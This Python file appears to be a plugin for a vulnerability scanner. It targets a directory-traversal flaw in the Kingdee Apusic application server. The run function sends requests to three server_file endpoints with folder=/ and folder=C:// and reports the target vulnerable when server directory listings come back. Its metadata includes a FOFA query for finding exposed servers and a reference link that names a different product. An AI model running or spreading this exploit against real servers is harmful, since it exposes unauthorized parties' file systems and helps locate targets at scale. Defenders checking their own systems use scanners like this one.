#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/oa/极限OA/极限OA video_file.php 任意文件读取漏洞.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '金蝶OA Apusic应用服务器(中间件) server_file 目录遍历',

      'level'     :   'low',

      'FOFA'      :   'app="Apusic-公司产品" && title=="欢迎使用Apusic应用服务器"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/admin/protected/selector/server_file/files?folder=/'
  url1 = url + target
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if re.search(r'total.*?rows.*?folder.*?name.*?path.*?/',res.text,re.S):
      ret['url'] = url1
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass
  target2 = '/appmonitor/protected/selector/server_file/files?folder=C://&suffix='
  url2 = url + target2
  try:
    resp=requests.get(url=url2,headers=headers,timeout=5,verify=False)
    if re.search(r'total.*?rows.*?folder.*?name.*?path.*?/',resp.text,re.S):
      ret['url'] = url2
      ret['ifbug'] = True
      resp.close()
      return ret
  except:
    pass
  target3 = '/appmonitor/protected/selector/server_file/files?folder=/&suffix='
  url3 = url + target3
  try:
    req=requests.get(url=url3,headers=headers,timeout=5,verify=False)
    if re.search(r'total.*?rows.*?folder.*?name.*?path.*?/',req.text,re.S):
      ret['url'] = url3
      ret['ifbug'] = True
      req.close()
      return ret
    else:
      return ret
  except:
    return ret